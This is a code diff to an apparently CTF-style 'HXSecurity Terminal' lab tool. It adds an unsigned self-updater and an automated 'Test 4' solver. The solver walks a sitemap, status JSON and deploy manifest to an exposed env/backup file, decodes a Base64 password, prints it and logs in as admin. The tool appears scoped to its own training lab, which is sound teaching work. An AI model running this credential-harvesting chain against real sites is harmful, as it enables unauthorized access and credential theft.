@@ -19,8 +19,10 @@ import http.cookiejar
 import json
 import os
 import re
+import shutil
 import ssl
 import sys
+import tempfile
 import time
 import urllib.error
 import urllib.parse
@@ -30,7 +32,9 @@ from typing import Iterable, Optional
 
 # Public-safe default: Admin is locked unless a key hash is provided by env.
 LOCAL_DEFAULT_ADMIN_CODE_SHA256 = ""
-USER_AGENT = "curl/8.0 HXSecurity-Terminal/0.3"
+CURRENT_VERSION = "v0.4.0"
+USER_AGENT = "curl/8.0 HXSecurity-Terminal/0.4"
+RELEASE_API_URL = "https://api.github.com/repos/Afterhoursmc-gg/hxsecurity-terminal/releases/latest"
 REQUEST_TIMEOUT = 10
 ADMIN_VERIFY_URL = os.environ.get("HXSECURITY_ADMIN_VERIFY_URL", "https://lab.hxsecurity.net/api/terminal/admin/verify")
 
@@ -87,6 +91,7 @@ B64_LINE_RE = re.compile(r"(?im)^\s*([A-Z0-9_]*(?:PASSWORD|PASS|SECRET|TOKEN)[A-
 SUCCESS_TEXT = "TEST 1 SUCCESS, WELCOME BACK HACKER!"
 TEST2_SUCCESS_TEXT = "TEST 2 SUCCESS, ACCESS CHAIN COMPLETE!"
 TEST3_SUCCESS_TEXT = "TEST 3 SUCCESS, RELEASE TRACE COMPLETE!"
+TEST4_SUCCESS_TEXT = "TEST 4 SUCCESS, SERVICE MAP COMPLETE!"
 PATH_RE = re.compile(r"/[-A-Za-z0-9_./]+")
 
 
@@ -127,6 +132,58 @@ class HXTerminal:
                 return HttpResult(url, int(resp.status), resp.read(), resp.headers)
         except urllib.error.HTTPError as e:
             return HttpResult(url, int(e.code), e.read(), e.headers)
+
+    def request_json(self, url: str) -> object:
+        res = self.request(url)
+        if res.status != 200:
+            raise RuntimeError(f"HTTP {res.status} from {url}")
+        return json.loads(res.text)
+
+    def check_for_update(self, apply: bool = False) -> bool:
+        print(f"[update] current version: {CURRENT_VERSION}")
+        try:
+            data = self.request_json(RELEASE_API_URL)
+            latest = str(data.get("tag_name") or "")
+            assets = data.get("assets") or []
+            asset_url = None
+            for asset in assets:
+                if asset.get("name") == "hxsecurity_terminal.py":
+                    asset_url = asset.get("browser_download_url")
+                    break
+        except Exception as exc:
+            print(f"[update] failed to check latest release: {exc}")
+            return False
+        if not latest or not asset_url:
+            print("[update] latest release does not include hxsecurity_terminal.py")
+            return False
+        print(f"[update] latest version: {latest}")
+        if latest == CURRENT_VERSION or not release_is_newer(latest, CURRENT_VERSION):
+            print("[update] already up to date")
+            return False
+        print(f"[update] update available: {CURRENT_VERSION} -> {latest}")
+        print(f"[update] download: {asset_url}")
+        if not apply:
+            print("[update] choose Admin menu option 5 to install the update")
+            return True
+        current = Path(__file__).resolve()
+        with tempfile.NamedTemporaryFile("wb", delete=False, suffix=".py") as tmp:
+            tmp_path = Path(tmp.name)
+            req = urllib.request.Request(asset_url, headers={"User-Agent": USER_AGENT})
+            with urllib.request.urlopen(req, timeout=REQUEST_TIMEOUT) as resp:
+                tmp.write(resp.read())
+        compile(tmp_path.read_text(encoding="utf-8"), str(tmp_path), "exec")
+        backup = current.with_suffix(current.suffix + f".{CURRENT_VERSION}.bak")
+        shutil.copy2(current, backup)
+        shutil.copy2(tmp_path, current)
+        os.chmod(current, 0o755)
+        try:
+            tmp_path.unlink()
+        except OSError:
+            pass
+        print(f"[update] installed {latest}")
+        print(f"[update] backup: {backup}")
+        print("[update] restart the terminal to use the new version")
+        return True
 
     def enumerate_files(self, base_url: str, words: Iterable[str] = DEFAULT_WORDS, exts: Iterable[str] = DEFAULT_EXTENSIONS) -> list[HttpResult]:
         hits: list[HttpResult] = []
@@ -386,6 +443,87 @@ class HXTerminal:
         return False
 
 
+    def run_test4_auto(self, start_url: str) -> bool:
+        base_url = normalize_base_url(start_url)
+        assert_allowed_target(base_url)
+        print(f"[test4] target: {base_url}")
+        print("[test4] tracing sitemap/status/manifest/archive chain...")
+        login_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "test4/login")
+        login = self.request(login_url)
+        release = header_get(login.headers, "x-hx-release")
+        if login.status != 200 or not release:
+            print(f"[test4] missing Test 4 login/header clue; status={login.status}")
+            return False
+        print("[test4] login/header clue recovered")
+        sitemap_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", "sitemap.xml")
+        sitemap = self.request(sitemap_url)
+        if sitemap.status != 200:
+            print(f"[test4] sitemap unavailable; status={sitemap.status}")
+            return False
+        status_paths = []
+        for match in re.findall(r"https?://[^<\s]+|/[-A-Za-z0-9_./]+", sitemap.text):
+            parsed_path = urllib.parse.urlparse(match).path if match.startswith("http") else match
+            if parsed_path.startswith("/test4/status/"):
+                status_paths.append(parsed_path)
+        if not status_paths:
+            print("[test4] no Test 4 status path found in sitemap")
+            return False
+        print("[test4] sitemap clue recovered")
+        status_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", status_paths[0].lstrip("/"))
+        status = self.request(status_url)
+        if status.status != 200:
+            print(f"[test4] status JSON unavailable; status={status.status}")
+            return False
+        try:
+            status_data = json.loads(status.text)
+        except Exception:
+            print("[test4] status body is not JSON")
+            return False
+        manifest_path = status_data.get("deployManifest")
+        if not isinstance(manifest_path, str) or not manifest_path.startswith("/test4/"):
+            print("[test4] no deploy manifest in status JSON")
+            return False
+        print("[test4] status JSON clue recovered")
+        manifest_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", manifest_path.lstrip("/"))
+        manifest = self.request(manifest_url)
+        if manifest.status != 200:
+            print(f"[test4] manifest unavailable; status={manifest.status}")
+            return False
+        artifact_paths = [p for p in PATH_RE.findall(manifest.text) if p.startswith("/test4/") and ("bak" in p or "env" in p or "config" in p)]
+        if not artifact_paths:
+            print("[test4] no archived env/config artifact path found in manifest")
+            return False
+        print("[test4] manifest clue recovered")
+        secret = None; secret_key = None; artifact_url = None
+        for artifact_path in artifact_paths:
+            current_artifact_url = urllib.parse.urljoin(base_url.rstrip("/") + "/", artifact_path.lstrip("/"))
+            artifact = self.request(current_artifact_url)
+            if artifact.status == 200:
+                found = extract_b64_secret(artifact.text)
+                if found:
+                    secret_key, secret = found
+                    artifact_url = current_artifact_url
+                    break
+        if not secret:
+            print("[test4] no Base64 credential marker found in chained artifact")
+            return False
+        print(f"[test4] credential marker found: {secret_key}")
+        print(f"[test4] sitemap URL: {sitemap_url}")
+        print(f"[test4] status URL: {status_url}")
+        print(f"[test4] manifest URL: {manifest_url}")
+        print(f"[test4] artifact URL: {artifact_url}")
+        print("[test4] decoded credential recovered")
+        print("[test4] recovered username: admin")
+        print(f"[test4] recovered password: {secret}")
+        body = urllib.parse.urlencode({"username": "admin", "password": secret}).encode()
+        res = self.request(login_url, method="POST", data=body)
+        if TEST4_SUCCESS_TEXT in res.text:
+            print(TEST4_SUCCESS_TEXT)
+            return True
+        print(f"[test4] login did not reach success page; status={res.status} size={res.size}")
+        return False
+
+
 def is_generic_block(res: HttpResult) -> bool:
     text = res.text[:6000]
     if res.status == 403 and "cloudflare" in text.lower() and "attention required" in text.lower():
@@ -417,6 +555,15 @@ def header_get(headers: object, name: str) -> Optional[str]:
         if str(key).lower() == wanted:
             return str(value)
     return None
+
+
+def version_tuple(tag: str) -> tuple[int, ...]:
+    nums = re.findall(r"\d+", tag)
+    return tuple(int(n) for n in nums[:3]) if nums else (0,)
+
+
+def release_is_newer(latest: str, current: str) -> bool:
+    return version_tuple(latest) > version_tuple(current)
 
 
 def normalize_base_url(value: str) -> str:
@@ -506,12 +653,15 @@ def admin_menu() -> None:
         pause_before_exit()
         raise SystemExit(1)
     term = HXTerminal()
+    term.check_for_update(apply=False)
     while True:
         print("\nADMIN PLAN - FULL LAB AUTOMATION")
         print("1) Auto-run HXSecurity Test 1")
         print("2) Auto-run HXSecurity Test 2")
         print("3) Auto-run HXSecurity Test 3")
-        print("4) Show registered tests")
+        print("4) Auto-run HXSecurity Test 4")
+        print("5) Check/install terminal update")
+        print("6) Show registered tests")
         print("0) Exit")
         choice = input("hxsecurity> ").strip()
         if choice == "1":
@@ -527,10 +677,17 @@ def admin_menu() -> None:
             ok = term.run_test3_auto(url)
             print("[result] PASS" if ok else "[result] FAIL")
         elif choice == "4":
+            url = input("Start URL/domain: ").strip() or "https://lab.hxsecurity.net/test4/login"
+            ok = term.run_test4_auto(url)
+            print("[result] PASS" if ok else "[result] FAIL")
+        elif choice == "5":
+            term.check_for_update(apply=True)
+        elif choice == "6":
             print("Registered tests:")
             print("- test1: exposed backup/config artifact with Base64 credential, admin login validation")
             print("- test2: chained robots/header/manifest clue with Base64 credential, admin login validation")
             print("- test3: chained security/header/runbook/manifest clue with Base64 credential, admin login validation")
+            print("- test4: chained sitemap/status/manifest archived-env clue with Base64 credential, admin login validation")
         elif choice == "0":
             return
         else:
